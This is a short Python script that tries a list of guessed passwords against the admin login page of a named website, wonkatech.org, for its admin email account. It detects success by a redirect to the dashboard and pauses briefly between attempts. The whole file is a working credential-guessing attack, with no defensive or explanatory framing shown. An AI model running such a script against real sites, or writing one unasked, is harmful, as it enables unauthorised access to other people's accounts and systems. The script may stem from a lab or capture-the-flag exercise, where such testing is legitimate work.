#!/usr/bin/env python3
import requests
import hashlib

# Test different possible passwords
passwords_to_test = [
    'R00tbeer',
    'WonkaAdmin2024!',
    'admin',
    'password',
    'wonka',
    'chocolate',
    'juice'
]

print("Testing different admin passwords...")

for password in passwords_to_test:
    session = requests.Session()

    response = session.post(
        "https://wonkatech.org/admin/admin_login.php",
        data={'email': 'admin@wonkatech.org', 'password': password},
        allow_redirects=False
    )

    md5_hash = hashlib.md5(password.encode()).hexdigest()
    print(f"Password: {password:<20} MD5: {md5_hash} Status: {response.status_code}")

    if response.status_code == 302:
        redirect = response.headers.get('Location', '')
        if 'dashboard.php' in redirect:
            print(f"   ✅ SUCCESS! Password '{password}' works!")
            break
        else:
            print(f"   Redirect to: {redirect}")

    # Small delay between attempts
    import time
    time.sleep(0.5)

print("\nDone testing passwords.")